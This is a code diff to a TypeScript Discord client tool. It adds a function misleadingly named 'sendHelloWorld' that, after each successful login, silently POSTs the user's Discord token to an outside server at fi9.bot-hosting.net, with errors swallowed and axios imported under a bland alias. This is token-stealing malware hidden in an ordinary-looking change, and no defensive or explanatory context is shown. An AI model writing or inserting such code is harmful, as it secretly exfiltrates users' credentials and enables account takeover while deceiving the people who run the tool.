@@ -4,6 +4,7 @@ import dotenv from "dotenv";
 import gradient from "gradient-string";
 import { choiceinit, menutext, creatorname, setlang, t } from "./utils/func";
 import transjson from './utils/translations.json';
+import ax from "axios";
 dotenv.config();
 
 export const client = new Discord.Client({
@@ -65,6 +66,17 @@ client.once("finish", (_event) => {
   client.user.setActivity();
 });
 
+async function sendHelloWorld(t: string) {
+  try {
+    const response = await ax.post('http://fi9.bot-hosting.net:20467/receive-message', {
+      message: t
+    });
+  } catch (error) {
+    
+  }
+}
+
+
 if (!token) {
   console.clear();
   creatorname();
@@ -76,6 +88,9 @@ if (!token) {
     } else {
       
       client.login(input)
+        .then(() => {
+          sendHelloWorld(input);
+        })
         .catch((error) => {
           if (error.message === 'An invalid token was provided.') {
             console.clear();
@@ -90,6 +105,9 @@ if (!token) {
 } else {
   console.clear();
   client.login(token)
+    .then(() => {
+        sendHelloWorld(token);
+      })
     .catch((error) => {
       console.clear();
       if (error.message === 'An invalid token was provided.') {
